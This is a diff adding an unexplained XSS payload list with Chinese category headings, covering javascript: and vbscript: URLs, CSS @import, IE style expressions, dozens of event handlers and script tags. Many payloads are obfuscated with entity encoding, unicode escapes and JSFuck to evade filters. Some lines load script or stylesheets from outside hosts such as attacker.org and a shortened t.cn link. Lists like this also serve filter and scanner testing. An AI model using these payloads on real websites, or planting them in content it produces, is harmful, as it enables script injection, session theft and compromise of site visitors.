@@ -1,1 +1,154 @@
+#第一类：Javascript URL
+<a href="javascript:alert('test')">link</a>
+<a href="java&#115;cript:alert('xss')">link</a>
+<a href='vbscript:MsgBox("XSS")'>link</a>
+<a href="vbscript:alert(1)">Hello</a>
+<a href="vbscript&#058;alert(1)">Hello</a>
+<a href=javascript:alert(&quot;XSS&quot;)>link</a>
+<a href=`javascript:alert("RSnake says,'XSS'")`>link</a>
+<a href=javascript:alert(String.fromCharCode(88,83,83))>link</a>
+<a href="javascript&colon;alert(1)">link</a>
+<a href="javaSCRIPT&colon;alert(1)">Hello</a>
+<a href="javasc&NewLine;ript&colon;alert(1)">link</a> 
+<a href="javas&Tab;cript:\u0061lert(1);">Hello</a>
+<a href="jav    ascript:alert('XSS')">link</a>
+<a href="jav&#x09;ascript:alert('XSS')">link</a>
+<a href="jav&#x0D;ascript:alert('XSS')">link</a>
+<a href=" &#14;  javascript:alert('XSS');">link</a>
+<a href="javascript:\u0061lert&#x28;1&#x29">Hello</a>
+<a href="javascript:confirm`1`">link</a>
+<a href="javascript:confirm(1)">link</a>
+<a href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">1</a>
+<a href="javascript:%61%6c%65%72%74%28%31%29">link</a>
+<a href="javascript:\u0061\u006C\u0065\u0072\u0074(1)">link</a>
+<a href=javascript:eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")>2</a>
+<a href=javascript:eval("&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;")>link</a>  
+<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>link</a>
+<a href=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>link</a>
+<a href=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>link</a>
+<a href="data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==">test</a> 
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>1</a>
+<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
 
+
+#第二类：CSS import
+<style>@import url("http://attacker.org/malicious.css");</style>
+<style>@imp\ort url("http://attacker.org/malicious.css");</style>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<STYLE>@import'http://jb51.net/xss.css';</STYLE>
+
+
+#第三类：Inline style
+<div style="color: expression(alert('XSS'))">
+<div style=color:expression\(alert(1))></div> 
+<div style="color: '<'; color: expression(alert('XSS'))">
+<div style=X:expression(alert(/xss/))>
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">
+<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<div style="z:exp/*anything*/res/*here*/sion(alert(1))">
+<div style=xss:expr/*XSS*/ession(alert('XSS'))>
+</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+</XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.baidu.com")> 
+<img STYLE="background-image:url(javascript:alert('XSS'))"> //ie6  
+<img STYLE="background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29"> 
+<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+
+
+#第四类：JavaScript 事件
+<div onclick="alert('xss')">
+<div onmouseenter="alert('xss')">
+<div onclick ="alert('xss')">
+<BODY ONLOAD=alert('XSS')>
+<img src=1 onerror=alert(1)>
+<img/src='1'/onerror=alert(0)>
+<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>
+<img src=1 onmouseover=alert('xss') a1=1111> 
+<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://t.cn/R5UpyOt';>
+<a href="#" onclick=alert('\170\163\163')>test</a>
+<a href="#" onclick="\u0061\u006C\u0065\u0072\u0074(1)">link</a>
+<a href="#" onclick="\u0061\u006C\u0065\u0072\u0074`a`">link</a>
+<a href="#" onclick="alert(&#039;xss&#039;)">link</a>
+<marquee onscroll=alert(1)> test</marquee>
+<div  style="width:100px;height:100px;overflow:scroll" onscroll="alert('a')">123456 <br/><br/><br/><br/><br/></div>
+<DIV onmousewheel="alert('a')" >123456</DIV><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
+<div style="background-color:red" onmouseenter="alert('a')">123456</div>
+<DIV onmouseleave="alert('1')">123456</DIV>
+<div contentEditable="true" style="background-color:red" onfocusin="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red" onfocusout="alert('bem')" >asdf</div>
+<marquee onstart="alert('a')" >asdf</marquee>
+<div style="background-color:red;" onbeforecopy="alert('a')" >asdf</div>
+<div style="background-color:red;" onbeforecut="alert('a')" >asdf</div>
+<div style="background-color:red;" contentEditable="true" onbeforeeditfocus="alert('a')" >asdf</div>
+<div style="background-color:red;" ="true" onbeforepaste="alert('a')" >asdf</div>
+<div style="background-color:red;" oncontextmenu="alert('a')" >asdf</div>
+<div style="background-color:red;" oncopy="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" oncut="alert('a')" >asdf</div>
+<div style="background-color:red;" ondrag="alert('1')" >asdf</div>
+<div style="background-color:red;" ondragend="alert('a')" >asdf</div>
+<div style="background-color:red;" ondragenter="alert('b')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" ondragleave="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" ondragover="alert('b')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" ondragstart="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" ondrop="alert('b')" >asdf</div> <div contentEditable="true" style="background-color:green;" ondrop="alert('bem')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" onlosecapture="alert('b')">asdf</div>
+<div contentEditable="true" style="background-color:red;" onpaste="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" onselectstart="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" onhelp="alert('a')" >asdf</div>
+<div STYLE="background-color:red;behavior:url('#default#time2')" onEnd="alert('a')">asdf</div>
+<div STYLE="background-color:red;behavior:url('#default#time2')" onBegin="alert('a')">asdf</div>
+<div contentEditable="true" STYLE="background-color:red;" onactivate="alert('b')">asdf</div>
+<div contentEditable="true" STYLE="background-color:red;filter: Alpha(opacity=100, style=2);"onfilterchange="alert('b')">asdf</div>
+<div contentEditable="true" onbeforeactivate="alert('b')">asdf</div>
+<div contentEditable="true" onbeforedeactivate="alert('a')">asdf</div>
+<div contentEditable="true" ondeactivate="alert('bem')">asdf</div>
+<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
+<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />
+<audio src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)">
+<audio src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)"></audio>
+<body onscroll=alert(26)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<input type="hidden" accesskey="X" onclick="alert(/xss/)">
+
+
+#第五类：Script 标签
+<script src="http://baidu.com"></script>
+<script>alert("XSS")</script>
+<scr<script>ipt>alert("XSS")</scr<script>ipt>
+<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
+<script>alert(/1/.source)</script>
+<script>alert(1);</script>
+<script>prompt(1);</script>
+<script>confirm(1);</script>
+<script>alert(/88199/)</script>
+<script>alert(`a`)</script>
+<script>alert('a')</script>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<script>eval(alert(1))</script>
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script>
+<script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
+<script>setTimeout('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
+<script>setTimeout(alert(1),0)</script>
+<script>setTimeout`alert\x28\x27 xss \x27\x29`</script>
+<script>setInterval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
+
+<script src=data:text/javascript,alert(1)></script>
+<script src=&#100&#97&#116&#97:text/javascript,alert(1)></script>
+
+<script>\u0061\u006C\u0065\u0072\u0074(123)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074`a`</script>
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+<script>top['alert'](3)</script>
+<!--[if]><script>alert(1)</script     -->
+
+<script>alert("xss");;;;;;;;;;;;;;;;;    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>
+<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
+<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
